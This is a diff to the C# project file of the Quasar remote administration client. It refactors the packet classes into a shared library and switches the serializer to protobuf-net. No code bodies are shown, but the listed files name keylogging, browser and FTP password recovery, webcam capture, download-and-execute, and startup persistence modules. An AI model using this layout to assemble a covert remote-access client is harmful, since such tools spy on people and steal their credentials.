@@ -47,11 +47,16 @@
       <HintPath>..\packages\MouseKeyHook.5.6.0\lib\net40\Gma.System.MouseKeyHook.dll</HintPath>
     </Reference>
     <Reference Include="Microsoft.VisualBasic" />
+    <Reference Include="protobuf-net, Version=2.3.0.0, Culture=neutral, PublicKeyToken=257b51d87d2e4d67, processorArchitecture=MSIL">
+      <HintPath>..\packages\protobuf-net.2.3.17\lib\net40\protobuf-net.dll</HintPath>
+    </Reference>
     <Reference Include="System" />
+    <Reference Include="System.Configuration" />
     <Reference Include="System.Drawing" />
     <Reference Include="System.Management" />
     <Reference Include="System.Runtime.Serialization" />
     <Reference Include="System.Security" />
+    <Reference Include="System.ServiceModel" />
     <Reference Include="System.Windows.Forms" />
     <Reference Include="System.Xml" />
   </ItemGroup>
@@ -110,17 +115,6 @@
     <Compile Include="Core\Installation\ClientUninstaller.cs" />
     <Compile Include="Core\Installation\ClientUpdater.cs" />
     <Compile Include="Core\Installation\Startup.cs" />
-    <Compile Include="Core\NetSerializer\CodeGenContext.cs" />
-    <Compile Include="Core\NetSerializer\Helpers.cs" />
-    <Compile Include="Core\NetSerializer\ITypeSerializer.cs" />
-    <Compile Include="Core\NetSerializer\Primitives.cs" />
-    <Compile Include="Core\NetSerializer\Serializer.cs" />
-    <Compile Include="Core\NetSerializer\TypeSerializers\ArraySerializer.cs" />
-    <Compile Include="Core\NetSerializer\TypeSerializers\DictionarySerializer.cs" />
-    <Compile Include="Core\NetSerializer\TypeSerializers\EnumSerializer.cs" />
-    <Compile Include="Core\NetSerializer\TypeSerializers\GenericSerializer.cs" />
-    <Compile Include="Core\NetSerializer\TypeSerializers\ObjectSerializer.cs" />
-    <Compile Include="Core\NetSerializer\TypeSerializers\PrimitivesSerializer.cs" />
     <Compile Include="Core\Networking\Client.cs" />
     <Compile Include="Core\Commands\CommandHandler.cs" />
     <Compile Include="Core\Commands\ConnectionHandler.cs" />
@@ -132,88 +126,18 @@
     <Compile Include="Core\Cryptography\AES.cs" />
     <Compile Include="Core\Cryptography\SHA256.cs" />
     <Compile Include="Core\Extensions\RegistryKeyExtensions.cs" />
+    <Compile Include="Core\Networking\PacketHandler.cs" />
     <Compile Include="Core\Networking\QuasarClient.cs" />
-    <Compile Include="Core\Packets\ClientPackets\GetChangeRegistryValueResponse.cs" />
-    <Compile Include="Core\Packets\ClientPackets\GetConnectionsResponse.cs" />
-    <Compile Include="Core\Packets\ClientPackets\GetCreateRegistryKeyResponse.cs" />
-    <Compile Include="Core\Packets\ClientPackets\GetCreateRegistryValueResponse.cs" />
-    <Compile Include="Core\Packets\ClientPackets\GetDeleteRegistryKeyResponse.cs" />
-    <Compile Include="Core\Packets\ClientPackets\GetDeleteRegistryValueResponse.cs" />
-    <Compile Include="Core\Packets\ClientPackets\GetWebcamResponse.cs" />
-    <Compile Include="Core\Packets\ClientPackets\GetWebcamsResponse.cs" />
-    <Compile Include="Core\Packets\ClientPackets\GetPasswordsResponse.cs" />
-    <Compile Include="Core\Packets\ClientPackets\GetRegistryKeysResponse.cs" />
-    <Compile Include="Core\Packets\ClientPackets\GetRenameRegistryKeyResponse.cs" />
-    <Compile Include="Core\Packets\ClientPackets\GetRenameRegistryValueResponse.cs" />
-    <Compile Include="Core\Packets\ClientPackets\SetStatusFileManager.cs" />
-    <Compile Include="Core\Packets\PacketRegistery.cs" />
-    <Compile Include="Core\Packets\ServerPackets\DoWebcamStop.cs" />
-    <Compile Include="Core\Packets\ServerPackets\DoAskElevate.cs" />
-    <Compile Include="Core\Packets\ServerPackets\DoChangeRegistryValue.cs" />
-    <Compile Include="Core\Packets\ServerPackets\DoCloseConnection.cs" />
-    <Compile Include="Core\Packets\ServerPackets\DoCreateRegistryKey.cs" />
-    <Compile Include="Core\Packets\ServerPackets\DoCreateRegistryValue.cs" />
-    <Compile Include="Core\Packets\ServerPackets\DoDeleteRegistryKey.cs" />
-    <Compile Include="Core\Packets\ServerPackets\DoDeleteRegistryValue.cs" />
-    <Compile Include="Core\Packets\ServerPackets\DoKeyboardEvent.cs" />
-    <Compile Include="Core\Packets\ServerPackets\DoLoadRegistryKey.cs" />
-    <Compile Include="Core\Packets\ServerPackets\DoRenameRegistryKey.cs" />
-    <Compile Include="Core\Packets\ServerPackets\DoRenameRegistryValue.cs" />
-    <Compile Include="Core\Packets\ServerPackets\GetConnections.cs" />
-    <Compile Include="Core\Packets\ServerPackets\GetWebcam.cs" />
-    <Compile Include="Core\Packets\ServerPackets\GetWebcams.cs" />
-    <Compile Include="Core\Packets\ServerPackets\GetPasswords.cs" />
-    <Compile Include="Core\Packets\ServerPackets\SetAuthenticationSuccess.cs" />
     <Compile Include="Core\Recovery\FtpClients\FileZilla.cs" />
     <Compile Include="Core\Recovery\FtpClients\WinSCP.cs" />
     <Compile Include="Core\Registry\RegistryEditor.cs" />
     <Compile Include="Core\Registry\RegistrySeeker.cs" />
-    <Compile Include="Core\Registry\RegSeekerMatch.cs" />
-    <Compile Include="Core\Registry\RegValueData.cs" />
     <Compile Include="Core\Utilities\FileSplit.cs" />
     <Compile Include="Core\Data\Host.cs" />
     <Compile Include="Core\Utilities\HostsManager.cs" />
     <Compile Include="Core\Utilities\NativeMethods.cs" />
-    <Compile Include="Core\Utilities\UnsafeStreamCodec.cs" />
-    <Compile Include="Core\Compression\JpgCompression.cs" />
     <Compile Include="Core\Extensions\SocketExtensions.cs" />
     <Compile Include="Core\Helper\KeyloggerHelper.cs" />
-    <Compile Include="Core\Packets\ClientPackets\GetDesktopResponse.cs" />
-    <Compile Include="Core\Packets\ClientPackets\GetDirectoryResponse.cs" />
-    <Compile Include="Core\Packets\ClientPackets\DoDownloadFileResponse.cs" />
-    <Compile Include="Core\Packets\ClientPackets\GetDrivesResponse.cs" />
-    <Compile Include="Core\Packets\ClientPackets\GetKeyloggerLogsResponse.cs" />
-    <Compile Include="Core\Packets\ClientPackets\GetProcessesResponse.cs" />
-    <Compile Include="Core\Packets\ClientPackets\GetStartupItemsResponse.cs" />
-    <Compile Include="Core\Packets\ClientPackets\GetSystemInfoResponse.cs" />
-    <Compile Include="Core\Packets\ClientPackets\GetMonitorsResponse.cs" />
-    <Compile Include="Core\Packets\ClientPackets\DoShellExecuteResponse.cs" />
-    <Compile Include="Core\Packets\ClientPackets\SetUserStatus.cs" />
-    <Compile Include="Core\Packets\PacketHandler.cs" />
-    <Compile Include="Core\Packets\ServerPackets\DoShutdownAction.cs" />
-    <Compile Include="Core\Packets\ServerPackets\DoStartupItemAdd.cs" />
-    <Compile Include="Core\Packets\ServerPackets\DoUploadFile.cs" />
-    <Compile Include="Core\Packets\ServerPackets\GetDesktop.cs" />
-    <Compile Include="Core\Packets\ServerPackets\GetDirectory.cs" />
-    <Compile Include="Core\Packets\ServerPackets\DoPathDelete.cs" />
-    <Compile Include="Core\Packets\ServerPackets\DoPathRename.cs" />
-    <Compile Include="Core\Packets\ServerPackets\DoDownloadFile.cs" />
-    <Compile Include="Core\Packets\ServerPackets\DoDownloadFileCancel.cs" />
-    <Compile Include="Core\Packets\ServerPackets\GetDrives.cs" />
-    <Compile Include="Core\Packets\ServerPackets\GetKeyloggerLogs.cs" />
-    <Compile Include="Core\Packets\ServerPackets\GetStartupItems.cs" />
-    <Compile Include="Core\Packets\ServerPackets\GetSystemInfo.cs" />
-    <Compile Include="Core\Packets\ServerPackets\DoProcessKill.cs" />
-    <Compile Include="Core\Packets\ServerPackets\GetMonitors.cs" />
-    <Compile Include="Core\Packets\ServerPackets\DoStartupItemRemove.cs" />
-    <Compile Include="Core\Packets\ServerPackets\DoShellExecute.cs" />
-    <Compile Include="Core\Packets\ServerPackets\DoShowMessageBox.cs" />
-    <Compile Include="Core\Packets\ServerPackets\DoClientUpdate.cs" />
-    <Compile Include="Core\Packets\ServerPackets\DoUploadAndExecute.cs" />
-    <Compile Include="Core\Packets\ServerPackets\DoVisitWebsite.cs" />
-    <Compile Include="Core\Packets\ServerPackets\DoMouseEvent.cs" />
-    <Compile Include="Core\Packets\ServerPackets\DoProcessStart.cs" />
-    <Compile Include="Core\Packets\ServerPackets\GetProcesses.cs" />
     <Compile Include="Core\Utilities\Shell.cs" />
     <Compile Include="Core\Recovery\Browsers\Chrome.cs" />
     <Compile Include="Core\Recovery\Browsers\Firefox.cs" />
@@ -224,26 +148,10 @@
     <Compile Include="Core\Recovery\Browsers\InternetExplorer.cs" />
     <Compile Include="Core\Recovery\Browsers\Opera.cs" />
     <Compile Include="Core\Recovery\Browsers\Yandex.cs" />
-    <Compile Include="Core\ReverseProxy\Packets\ReverseProxyConnect.cs" />
-    <Compile Include="Core\ReverseProxy\Packets\ReverseProxyConnectResponse.cs" />
-    <Compile Include="Core\ReverseProxy\Packets\ReverseProxyData.cs" />
-    <Compile Include="Core\ReverseProxy\Packets\ReverseProxyDisconnect.cs" />
     <Compile Include="Core\ReverseProxy\ReverseProxyClient.cs" />
     <Compile Include="Core\ReverseProxy\ReverseProxyCommandHandler.cs" />
-    <Compile Include="Core\Packets\ClientPackets\SetStatus.cs" />
-    <Compile Include="Core\Packets\ClientPackets\GetAuthenticationResponse.cs" />
-    <Compile Include="Core\Packets\IPacket.cs" />
-    <Compile Include="Core\Packets\ServerPackets\DoClientDisconnect.cs" />
-    <Compile Include="Core\Packets\ServerPackets\DoDownloadAndExecute.cs" />
-    <Compile Include="Core\Packets\ServerPackets\DoClientUninstall.cs" />
-    <Compile Include="Core\Packets\ServerPackets\GetAuthentication.cs" />
-    <Compile Include="Core\Packets\ServerPackets\DoClientReconnect.cs" />
     <Compile Include="Core\Helper\GeoLocationHelper.cs" />
     <Compile Include="Core\Utilities\Keylogger.cs" />
-    <Compile Include="Enums\MouseAction.cs" />
-    <Compile Include="Enums\PathType.cs" />
-    <Compile Include="Enums\ShutdownAction.cs" />
-    <Compile Include="Enums\UserStatus.cs" />
     <Compile Include="Program.cs" />
     <Compile Include="Properties\AssemblyInfo.cs" />
     <Compile Include="Config\Settings.cs" />
@@ -269,17 +177,20 @@
       <DesignTimeSharedInput>True</DesignTimeSharedInput>
     </Compile>
   </ItemGroup>
-  <ItemGroup />
+  <ItemGroup>
+    <ProjectReference Include="..\Quasar.Common\Quasar.Common.csproj">
+      <Project>{c7c363ba-e5b6-4e18-9224-39bc8da73172}</Project>
+      <Name>Quasar.Common</Name>
+    </ProjectReference>
+  </ItemGroup>
   <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
   <PropertyGroup>
     <PostBuildEvent Condition="'$(OS)' == 'Windows_NT' ">copy "$(TargetPath)" "$(TargetDir)client.bin" /Y</PostBuildEvent>
     <PostBuildEvent Condition="'$(OS)' != 'Windows_NT' ">cp "$(TargetPath)" "$(TargetDir)client.bin"</PostBuildEvent>
   </PropertyGroup>
   <PropertyGroup>
-    <PostBuildEvent>"$(SolutionDir)packages\ILMerge.2.14.1208\tools\ILMerge.exe" /out:"$(TargetDir)$(TargetName).all.exe" "$(TargetPath)" "$(TargetDir)Gma.System.MouseKeyHook.dll" /target:WinExe /wildcards /internalize
-copy "$(TargetDir)$(TargetName).all.exe" "$(TargetDir)client.bin" /Y
-copy "$(TargetDir)$(TargetName).all.exe" "$(TargetPath)" /Y
-del "$(TargetDir)$(TargetName).all.exe"</PostBuildEvent>
+    <PostBuildEvent>"$(SolutionDir)packages\ILMerge.2.14.1208\tools\ILMerge.exe" /out:"$(TargetDir)$(TargetName).all.exe" "$(TargetPath)" "$(TargetDir)Gma.System.MouseKeyHook.dll" "$(TargetDir)Quasar.Common.dll" /target:WinExe /wildcards /internalize
+copy "$(TargetDir)$(TargetName).all.exe" "$(TargetDir)client.bin" /Y</PostBuildEvent>
   </PropertyGroup>
   <!-- To modify your build process, add your task inside one of the targets below and uncomment it. 
        Other similar extension points exist, see Microsoft.Common.targets.
